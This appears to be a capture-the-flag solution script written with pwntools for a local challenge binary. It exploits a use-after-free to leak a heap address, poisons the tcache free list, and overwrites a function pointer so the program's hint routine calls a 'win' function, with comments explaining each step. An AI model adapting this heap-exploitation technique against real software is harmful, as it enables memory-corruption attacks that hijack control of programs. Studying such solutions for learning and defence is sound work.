#!/usr/bin/env python2

from pwn import *

def make_clone(p, clone_id, name):
    p.recvuntil('Choice: ', drop=True)
    p.sendline('A')
    p.recvuntil('Clone ID: ', drop=True)
    p.sendline(clone_id)
    p.recvuntil('Enter Name (max length 8): ', drop=True)
    p.sendline(name)

def kill_clone(p, clone_id):
    p.recvuntil('Choice: ', drop=True)
    p.sendline('B')
    p.recvuntil('Clone ID: ', drop=True)
    p.sendline(clone_id)

def name_clone(p, clone_id, new_name):
    p.recvuntil('Choice: ', drop=True)
    p.sendline('C')
    p.recvuntil('Clone ID: ', drop=True)
    p.sendline(clone_id)
    p.recvuntil('Enter Name (max length 8): ', drop=True)
    p.sendline(new_name)

def view_clone(p, clone_id):
    p.recvuntil('Choice: ', drop=True)
    p.sendline('D')
    p.recvuntil('Clone ID: ', drop=True)
    p.sendline(clone_id)
    p.recvuntil('Name: ', drop=True)
    return p.recvline()

def give_hint(p, clone_id):
    p.recvuntil('Choice: ', drop=True)
    p.sendline('H')
    p.recvuntil('Clone ID: ', drop=True)
    p.sendline(clone_id)


p = process('./usemedontabuseme')
e = p.elf

clones_addr = 0x804b0a0
viewclones_addr = 0x804b060
#print(e.got)
make_clone(p, '0', 'aaaa')
#make_clone(p, '1', 'aaaa\x21\x00\x00\x00')
#pause()
make_clone(p, '1', 'bbbb')
make_clone(p, '2', 'cccc')

kill_clone(p, '2')
kill_clone(p, '0') 
kill_clone(p, '1')
# num chunks in tcache bin is now 3

# clone 1 is at front of free list
# clone 1 fwd ptr points to clone 0
# can view clone 1 to get addr of clone 0
clone0_addr = u32(view_clone(p, '1')[:4])
clone1_addr = clone0_addr + 0x20

# addr of clone 2 will be same as clone 1
# since clone1 is at front of free list
make_clone(p, '2', 'aaaa\x21\x00\x00\x00')

# make clone 0 fwd ptr point to clone1_addr + 8
name_clone(p, '0', p32(clone1_addr + 8))

#malloc twice so clone 4 will point to clone1 + 8
make_clone(p, '3', '')

# now clone 2 points to clone1_addr
# and clone 4 points to clone1_addr + 8
# name clone 4 to overwrite hint() with win() in clone2
# add 0x6447 to clone 4 name to get past check in givehint
clone4_name = '\x47\x64\x00\x00' + p32(e.symbols['win'])
make_clone(p, '4', clone4_name)
give_hint(p, '2')

p.interactive()


